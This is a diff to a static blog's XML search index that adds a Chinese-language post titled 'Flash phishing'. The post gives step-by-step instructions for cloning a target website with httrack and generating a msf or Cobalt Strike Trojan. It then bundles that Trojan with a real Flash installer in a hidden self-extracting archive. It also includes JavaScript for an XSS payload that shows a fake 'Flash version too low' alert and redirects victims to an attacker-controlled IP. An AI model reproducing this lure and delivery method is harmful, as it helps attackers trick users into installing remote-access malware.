@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Flash 钓鱼</title>
+      <link href="/2021/08/30/Flash%E9%92%93%E9%B1%BC/"/>
+      <url>/2021/08/30/Flash%E9%92%93%E9%B1%BC/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>水一篇☔️</p></blockquote><ol><li><p>安装完整页面爬取工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kali</span><br><span class="line">apt-get install httrack</span><br><span class="line"># yum install httrack –y</span><br></pre></td></tr></table></figure></li><li><p>运行httrack，爬取需要爬取的页面，按提示填写</p></li><li><p>去比对官网页面修改不一样的地方，使首页和目标一样</p></li><li><p>下载flash正常exe，生成相应木马如msf/cs等</p></li><li><p>制作合成木马</p><ol><li>将两个木马放在同一个目录下</li><li>填写以exe结尾的文件名<img src="https://i.loli.net/2021/09/15/hADgpQo9v7EKmMT.png" alt="image.png"></li><li>点高级，进入自解压，填写解压绝对路径<img src="https://i.loli.net/2021/09/15/YdJI7hpLWfSm9NA.png" alt="image.png"></li><li>填写解压后的两个文件名<img src="https://i.loli.net/2021/09/15/OxdQ2IPTsuaDX1f.png" alt="image.png"></li><li>选择全部隐藏<img src="https://i.loli.net/2021/09/15/P7zt4fgok8KEIqh.png" alt="image.png"></li><li><img src="https://i.loli.net/2021/09/15/PICgvRpkDLZ6BU1.png" alt="image.png"><h3 id="flash结合xss"><a href="#flash结合xss" class="headerlink" title="flash结合xss"></a>flash结合xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;</span><br><span class="line">var iframe = document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">iframe.style.display=&quot;none&quot;;</span><br><span class="line">iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain,&#x27;);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[0].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;);</span><br><span class="line">window.location.href=&quot;http://192.168.0.110&quot;;</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> kali </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Kali 安装 Parallels Tools</title>
       <link href="/2021/08/30/Kali%20%E5%AE%89%E8%A3%85%20Parallels%20Tools/"/>
       <url>/2021/08/30/Kali%20%E5%AE%89%E8%A3%85%20Parallels%20Tools/</url>
